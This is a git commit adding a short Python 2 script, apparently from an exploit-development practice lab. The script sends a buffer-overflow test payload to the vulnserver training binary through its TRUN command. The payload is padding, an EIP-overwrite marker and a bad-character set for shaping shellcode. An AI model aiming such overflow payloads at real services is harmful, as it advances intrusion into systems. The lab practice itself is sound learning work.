56c3eb62baef06d613745e9e74d66c0b02901e65
Henry Post <henryfbp@gmail.com>
2020-04-07 14:28:11 -0500

    add badchar testing

---
+++ vagrant/kali/shared/Projects/vulnserver/badcharacter-testing-no-null.py
@@ -0,0 +1,20 @@
+#!/usr/bin/env python2
+
+
+
+import sys, socket
+from badchars import badchars
+from options import HOST, PORT, SHELLCODE_OFFSET
+
+shellcode = ('A' * SHELLCODE_OFFSET)
+shellcode += 'ABCD'  # this should fill the EIP register in vulnserver with 'ABCD' character aka 41 42 43 44
+shellcode += (badchars.replace('\x00', ''))  # nulls mess our payload up and cause it not to be loaded into memory
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+cmd = ('TRUN /.:/' + shellcode)
+
+# print("SEND "+cmd)
+s.send(cmd)
+print("sent %d bytes" % len(cmd))
+s.close()
